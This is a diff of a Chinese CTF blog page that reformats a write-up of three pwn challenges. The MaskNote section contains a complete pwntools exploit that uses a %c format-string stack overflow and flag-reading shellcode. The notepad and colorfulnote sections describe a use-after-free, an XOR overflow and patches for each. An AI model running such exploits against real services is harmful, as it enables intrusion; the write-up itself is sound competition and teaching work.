@@ -269,9 +269,9 @@
           
           
           <li>
-            <a href="/archive/">
+            <a href="/tags/">
               
-              归档
+              标签
               
               
             </a>
@@ -280,9 +280,9 @@
           
           
           <li>
-            <a href="/tags/">
+            <a href="/archive/">
               
-              标签
+              归档
               
               
             </a>
@@ -406,11 +406,11 @@
             <!-- WordCount start -->
             <div class="blank_box"></div>
             <span class="meta">
-              Estimated Reading Time <span class="post-count">1</span> Minutes
+              Estimated Reading Time <span class="post-count">2</span> Minutes
             </span>
             <div class="blank_box"></div>
             <span class="meta">
-              Words <span class="post-count">432</span> In Total
+              Words <span class="post-count">438</span> In Total
             </span>
             <div class="blank_box"></div>
             <!-- WordCount end -->
@@ -472,14 +472,37 @@
       <!-- Post Container -->
       <div class="col-lg-8 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
 
-        <h2 id="MaskNote"><a href="#MaskNote" class="headerlink" title="MaskNote"></a>MaskNote</h2><p><img src="mask1.png" alt="pic"><br>一道假的堆题，漏洞是sprintf的格式化字符串漏洞，过滤了%x,%n和%p，但是没用过滤%c，利用格式化字符串的%c可以实现栈溢出。<br><img src="mask2.png" alt="pic"><br>程序在初始化的时候mmap了一块很大的地址，可读可写可执行，塞shellcode就可以。<br><img src="mask3.png" alt="pic"></p>
-<h3 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h3><p>exp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> platform <span class="keyword">import</span> libc_ver</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">io = <span class="keyword">lambda</span> : r.interactive()</span><br><span class="line">sl = <span class="keyword">lambda</span> a : r.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b : r.sendlineafter(a,b)</span><br><span class="line">se = <span class="keyword">lambda</span> a : r.send(a)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b : r.sendafter(a,b)</span><br><span class="line">lg = <span class="keyword">lambda</span> name,data : log.success(name + <span class="string">&quot;:&quot;</span> + <span class="built_in">hex</span>(data))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span>():</span></span><br><span class="line">    gdb.attach(r)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="keyword">global</span> r  </span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    r=process(<span class="string">&#x27;./MaskNote&#x27;</span>)</span><br><span class="line">    <span class="comment">#r = remote(&quot;175.20.41.208&quot;,9999)</span></span><br><span class="line">    code = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">    code += shellcraft.read(<span class="string">&#x27;rax&#x27;</span>,<span class="number">0x80808100</span>,<span class="number">0x40</span>)</span><br><span class="line">    code += shellcraft.write(<span class="number">1</span>,<span class="number">0x80808100</span>,<span class="number">0x40</span>)</span><br><span class="line">    shellcode = asm(code)</span><br><span class="line">    gdb.attach(r)</span><br><span class="line">    sla(<span class="string">b&quot;your name:&quot;</span> ,<span class="string">b&quot;x1ngx1ng&quot;</span>*<span class="number">2</span>+shellcode)</span><br><span class="line">    sla(<span class="string">b&quot;Mask:&quot;</span>,<span class="string">b&quot;%136c&quot;</span>+p64(<span class="number">0x80808010</span>))</span><br><span class="line">    sla(<span class="string">b&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;5&quot;</span>)</span><br><span class="line">    io()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure></p>
-<h3 id="fix"><a href="#fix" class="headerlink" title="fix"></a>fix</h3><p>修复的话就把第一次read name的长度缩小就可以<br><img src="mask4.png" alt="pic"></p>
-<h2 id="notepad"><a href="#notepad" class="headerlink" title="notepad"></a>notepad</h2><p>一道2.35的堆题，利用没怎么看（不熟），就修了洞<br><img src="notepad1.png" alt="pic"><br>问题在这，free完堆块后指针置零的时候下标歪了。导致可以uaf</p>
-<h3 id="fix-1"><a href="#fix-1" class="headerlink" title="fix"></a>fix</h3><p><img src="notepad2.png" alt="pic"><br>修复的话就把下标改成了0<br><img src="notepad3.png" alt="pic"></p>
-<h2 id="colorfulnote"><a href="#colorfulnote" class="headerlink" title="colorfulnote"></a>colorfulnote</h2><p>main函数不知道为什么ida没法解析。就看汇编<br><img src="colorful1.png" alt="pic"><br>洞在这里，输入key1、key2异或之后有概率溢出，会导致进程崩溃</p>
-<h3 id="fix-2"><a href="#fix-2" class="headerlink" title="fix"></a>fix</h3><p>一开始想的是直接nop异或，但是报了服务异常<br>赛后问了nameless师兄，他的做法是nop下面那条把寄存器里的值存到栈上的指令。。。<br>很可惜当时没有试，痛失分数<br><img src="colorful2.png" alt="pic"></p>
-<h3 id="写不下去了"><a href="#写不下去了" class="headerlink" title="写不下去了"></a>写不下去了</h3><p>我即将死亡</p>
+        <h2 id="MaskNote">MaskNote</h2>
+<p><img src="mask1.png" alt="pic"><br>
+一道假的堆题，漏洞是sprintf的格式化字符串漏洞，过滤了%x,%n和%p，但是没用过滤%c，利用格式化字符串的%c可以实现栈溢出。<br>
+<img src="mask2.png" alt="pic"><br>
+程序在初始化的时候mmap了一块很大的地址，可读可写可执行，塞shellcode就可以。<br>
+<img src="mask3.png" alt="pic"></p>
+<h3 id="attack">attack</h3>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> platform <span class="keyword">import</span> libc_ver</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">io = <span class="keyword">lambda</span> : r.interactive()</span><br><span class="line">sl = <span class="keyword">lambda</span> a : r.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b : r.sendlineafter(a,b)</span><br><span class="line">se = <span class="keyword">lambda</span> a : r.send(a)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b : r.sendafter(a,b)</span><br><span class="line">lg = <span class="keyword">lambda</span> name,data : log.success(name + <span class="string">&quot;:&quot;</span> + <span class="built_in">hex</span>(data))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span>():</span></span><br><span class="line">    gdb.attach(r)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="keyword">global</span> r  </span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    r=process(<span class="string">&#x27;./MaskNote&#x27;</span>)</span><br><span class="line">    <span class="comment">#r = remote(&quot;175.20.41.208&quot;,9999)</span></span><br><span class="line">    code = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">    code += shellcraft.read(<span class="string">&#x27;rax&#x27;</span>,<span class="number">0x80808100</span>,<span class="number">0x40</span>)</span><br><span class="line">    code += shellcraft.write(<span class="number">1</span>,<span class="number">0x80808100</span>,<span class="number">0x40</span>)</span><br><span class="line">    shellcode = asm(code)</span><br><span class="line">    gdb.attach(r)</span><br><span class="line">    sla(<span class="string">b&quot;your name:&quot;</span> ,<span class="string">b&quot;x1ngx1ng&quot;</span>*<span class="number">2</span>+shellcode)</span><br><span class="line">    sla(<span class="string">b&quot;Mask:&quot;</span>,<span class="string">b&quot;%136c&quot;</span>+p64(<span class="number">0x80808010</span>))</span><br><span class="line">    sla(<span class="string">b&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;5&quot;</span>)</span><br><span class="line">    io()</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>
+<h3 id="fix">fix</h3>
+<p>修复的话就把第一次read name的长度缩小就可以<br>
+<img src="mask4.png" alt="pic"></p>
+<h2 id="notepad">notepad</h2>
+<p>一道2.35的堆题，利用没怎么看（不熟），就修了洞<br>
+<img src="notepad1.png" alt="pic"><br>
+问题在这，free完堆块后指针置零的时候下标歪了。导致可以uaf</p>
+<h3 id="fix-2">fix</h3>
+<p><img src="notepad2.png" alt="pic"><br>
+修复的话就把下标改成了0<br>
+<img src="notepad3.png" alt="pic"></p>
+<h2 id="colorfulnote">colorfulnote</h2>
+<p>main函数不知道为什么ida没法解析。就看汇编<br>
+<img src="colorful1.png" alt="pic"><br>
+洞在这里，输入key1、key2异或之后有概率溢出，会导致进程崩溃</p>
+<h3 id="fix-3">fix</h3>
+<p>一开始想的是直接nop异或，但是报了服务异常<br>
+赛后问了nameless师兄，他的做法是nop下面那条把寄存器里的值存到栈上的指令。。。<br>
+很可惜当时没有试，痛失分数<br>
+<img src="colorful2.png" alt="pic"></p>
+<h3 id="写不下去了">写不下去了</h3>
+<p>我即将死亡</p>
 
 
         <hr>
@@ -629,7 +652,7 @@
         <div id="toc" class="toc-article">
         <strong class="toc-title">目录</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#MaskNote"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">MaskNote</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#attack"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">attack</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#fix"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">fix</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#notepad"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">notepad</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#fix-1"><span class="toc-nav-number">2.1.</span> <span class="toc-nav-text">fix</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#colorfulnote"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">colorfulnote</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#fix-2"><span class="toc-nav-number">3.1.</span> <span class="toc-nav-text">fix</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%86%99%E4%B8%8D%E4%B8%8B%E5%8E%BB%E4%BA%86"><span class="toc-nav-number">3.2.</span> <span class="toc-nav-text">写不下去了</span></a></li></ol></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#MaskNote"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">MaskNote</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#attack"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">attack</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#fix"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">fix</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#notepad"><span class="toc-nav-number">2.</span> <span class="toc-nav-text">notepad</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#fix-2"><span class="toc-nav-number">2.1.</span> <span class="toc-nav-text">fix</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#colorfulnote"><span class="toc-nav-number">3.</span> <span class="toc-nav-text">colorfulnote</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#fix-3"><span class="toc-nav-number">3.1.</span> <span class="toc-nav-text">fix</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#%E5%86%99%E4%B8%8D%E4%B8%8B%E5%8E%BB%E4%BA%86"><span class="toc-nav-number">3.2.</span> <span class="toc-nav-text">写不下去了</span></a></li></ol></li></ol>
         
         </div>
       </aside>
